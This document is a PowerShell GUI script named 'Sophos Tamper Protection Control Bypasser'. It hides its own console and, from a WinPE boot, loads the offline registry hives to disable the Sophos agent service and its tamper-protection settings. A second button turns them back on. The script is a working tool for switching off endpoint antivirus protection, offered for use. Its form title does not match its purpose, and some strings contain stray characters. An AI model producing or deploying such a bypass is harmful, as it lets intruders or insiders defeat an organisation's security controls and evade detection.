#Create WinForm
# Hide PowerShell Console
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)


#-----[functions area]------

#Disable all
function DISTP {
        if (-not (Test-Path -Path "${DriveLetter}:\Windows\System32\config")){
        $DriveMsg = [System.Windows.MessageBox]::Show($DriveMsgBody,$DriveMsgTitle,$ButtonOK,$DriveMsgIcon)
        }else{
            REG LOAD HKLM\TEMPSYSTEM "${DriveLetter}:\Windows\System32\config\SYSTEM"
            REG LOAD HKLM\TEMPSOFTWARE ${DriveLetter}":\Windows\System32\config\SOFTWARE"
            New-ItemProperty -Path "HKLM:\TEMPSYSTEM\ControlSet001\Services\Sophos MCS Agent" -Name Start -PropertyType DWord -Value "4" -Force
            New-ItemProperty -Path "HKLM:\TEMPSYSTEM\ControlSet001\Services\Sophos Endpoint Defense\TamperProtection\Config" -Name SAVEnabled -PropertyType DWord -Value "0" -Force
            New-ItemProperty -Path "HKLM:\TEMPSYSTEM\ControlSet001\Services\Sophos Endpoint Defense\TamperProtection\Config" -Name SEDEnabled -PropertyType DWord -Value "0" -Force
            New-ItemProperty -Path "HKLM:\TEMPSOFTWARE\WOW6432Node\Sophos\SAVService\TamperProtection" -Name Enabled -PropertyType DWord -Value "0" -Force
            REG UNLOAD HKLM\TEMPSYSTEM
            REG UNLOAD HKLM\TEMPSOFTWARE
            if($?)
            {
            $SuccssMsg                    = [System.Windows.MessageBox]::Show($SuccessMsgbody,$SuccessMsgTitle,$ButtonOK,$SuccessMsgIcon)
            }
            else
            {
            $FailMsg                      = [System.Windows.MessageBox]::Show($FailMsgbody,$FailMsgTitle,$ButtonOK,$FailMsgIcon)
            }
        }
   }

#Enable all
function ENTP { 
    if (-not (Test-Path -Path "${DriveLetter}:\Windows\System32\config")){
        $DriveMsg = [System.Windows.MessageBox]::Show($DriveMsgBody,$DriveMsgTitle,$ButtonOK,$DriveMsgIcon)
        }else{
            REG LOAD HKLM\TEMPSYSTEM "${DriveLetter}:\Windows\System32\config\SYSTEM"
            REG LOAD HKLM\TEMPSOFTWARE "${DriveLetter}:\Windows\System32\config\SOFTWARE"
            New-ItemProperty -Path "HKLM:\TEMPSYSTEM\ControlSet001\Services\Sophos MCS Agent" -Name Start -PropertyType DWord -Value "2" -Force
            New-ItemProperty -Path "HKLM:\TEMPSYSTEM\ControlSet001\Services\Sophos Endpoint Defense\TamperProtection\Config" -Name SAVEnabled -PropertyType DWord -Value "1" -Force
            New-ItemProperty -Path "HKLM:\TEMPSYSTEM\ControlSet001\Services\Sophos Endpoint Defense\TamperProtection\Config" -Name SEDEnabled -PropertyType DWord -Value "1" -Force
            New-ItemProperty -Path "HKLM:\TEMPSOFTWARE\WOW6432Node\Sophos\SAVService\TamperProtection" -Name Enabled -PropertyType DWord -Value "1" -Force
            REG UNLOAD HKLM\TEMPSYSTEM
            REG UNLOAD HKLM\TEMPSOFTWARE
            if($?)
            {
            $SuccssMsg                    = [System.Windows.MessageBox]::Show($SuccessMsgbody,$SuccessMsgTitle,$ButtonOK,$SuccessMsgIcon)
            }
            else
            {
            $FailMsg                      = [System.Windows.MessageBox]::Show($FailMsgbody,$FailMsgTitle,$ButtonOK,$FailMsgIcon)
            }
        }
}

#Reboot PC with confirmation
function RebootPC { 
  $RebootMsg                    = [System.Windows.MessageBox]::Show($RebootMsgbody,$RebootMsgTitle,$ButtonBool,$RebootMsgIcon)
  if ($RebootMsg -eq 'Yes')
    {
        Restart-Computer
    }
    else
    {
        #Do Nothing
    }
}


# Init PowerShell Gui
Add-Type -AssemblyName System.Windows.Forms
# Create a new form
$Form                    = New-Object system.Windows.Forms.Form
# Define the size, title and background color
$Form.ClientSize         = '500,330'
$Form.text               = "Removable Storage Disable Tool"
$Form.BackColor          = "#ffffff"

#GUI Start Here

$Titel                           = New-Object system.Windows.Forms.Label
$Titel.text                      = "Sophos Tamper Protection Control Bypasser"
$Titel.AutoSize                  = $true
$Titel.width                     = 25
$Titel.height                    = 10
$Titel.location                  = New-Object System.Drawing.Point(20,10)
$Titel.Font                      = 'Microsoft Sans Serif,13'
$Description                     = New-Object system.Windows.Forms.Label
$Description.text                = "Run this program as admin under WINPE envornment`n(For example: Medicat USB).`nIt needs to reboot to your normal Windows, `nthen do it again to make it work."
$Description.AutoSize            = $false
$Description.width               = 450
$Description.height              = 80
$Description.location            = New-Object System.Drawing.Point(20,40)
$Description.Font                = 'Microsoft Sans Serif,10'
$DriveInputMsg                   = New-Object system.Windows.Forms.Label
$DriveInputMsg.text              = "Please input your correct system drive letter here:"
$DriveInputMsg.AutoSize          = $true
$DriveInputMsg.Location          = New-Object System.Drawing.Point(120,140)
$DriveInputBox                   = New-Object System.Windows.Forms.TextBox
$DriveInputBox.location          = New-Object System.Drawing.Point(200,160)
$DriveLetter                     = $DriveInputBox.Text

#-----------------[ Buttons ]------------------

#Add Buttons
#Disable All Button
$DisableAllBtn                   = New-Object system.Windows.Forms.Button
$DisableAllBtn.BackColor         = "#E32D4E"
$DisableAllBtn.text              = "Disable Sophos InterX tamper protection"
$DisableAllBtn.width             = 150
$DisableAllBtn.height            = 50
$DisableAllBtn.location          = New-Object System.Drawing.Point(80,200)
$DisableAllBtn.Font              = 'Microsoft Sans Serif,10'
$DisableAllBtn.ForeColor         = "#ffffff"
$DisableAllBtn.Add_Click({ DISTP })
$Form.Controls.Add($DisableAllBtn)


#Enable All Button
$EnableAllBtn                    = New-Object system.Windows.Forms.Button
$EnableAllBtn.BackColor          = "#54BF26"
$EnableAllBtn.text               = "Enable Sophos InterX tamper protection"
$EnableAllBtn.width              = 150
$EnableAllBtn.height             = 50
$EnableAllBtn.location           = New-Object System.Drawing.Point(260,200)
$EnableAllBtn.Font               = 'Microsoft Sans Serif,10'
$EnableAllBtn.ForeColor          = "#ffffff"
$EnableAllBtn.Add_Click({ ENTP })
$Form.Controls.Add($EnableAllBtn)

#Licensing
$Licensing                     = New-Object system.Windows.Forms.Label
$Licensing.text                = "Created by Thomas Hon aka mkaa`nLicensing with GNU Lesser General Public License v2.1"
$Licensing.AutoSize            = $false
$Licensing.width               = 450
$Licensing.height              = 50
$Licensing.location            = New-Object System.Drawing.Point(20,300)
$Licensing.Font                = 'Microsoft Sans Serif,7'
$Licensing.ForeColor                = 'Gray'
$Form.Controls.Add($Licensing)


# ---------------[ Message Box ] ------------------
Add-Type -AssemblyName PresentationCore,PresentationFramework
$ButtonBool                   = [System.Windows.MessageBoxButton]::YesNo
$ButtonOK                     = [System.Windows.MessageBoxButton]::OK

#Config Success

$SuccessMsgTitle              = "Done"
$SuccessMsgbody               = "Configuration Success"
$SuccessMsgIcon               = [System.Windows.MessageBoxImage]::Information


#Config Fail
$FailMsgTitle                 = "Fail"
$FailMsgbody                  = "Configuration Failed !`nPlease check if you have Admin Right or use Run as Admin to run this program.`nOr if you are doing this under WINPE"
$FailMsgIcon                  = [System.Windows.MessageBoxImage]::Error

#Check Drive Letter Fail
$DriveMsgTitle                 = "Failù"
$DriveMsgBody                  = "Configuration Failed !`nPlease check if you have input the correct drive letter"
$DriveMsgIcon                  = [System.Windows.MessageBoxImage]::Error

#Reboot Confirmation
$RebootMsgTitle               = "Reboot Confirmù"
$RebootMsgbody                = "Are you sure you are ready to reboot?ù"
$RebootMsgIcon                = [System.Windows.MessageBoxImage]::Warning
#$RebootMsg                    = [System.Windows.MessageBox]::Show($RebootMsgbody,$RebootMsgTitle,$ButtonBool,$RebootMsgIcon)


# ADD OTHER ELEMENTS ABOVE THIS LINE IF NEEDED
# Add the elements to the form
$Form.controls.AddRange(@($Titel,$Description,$DriveInputMsg,$DriveInputBox))


# Display the form
[void]$Form.ShowDialog()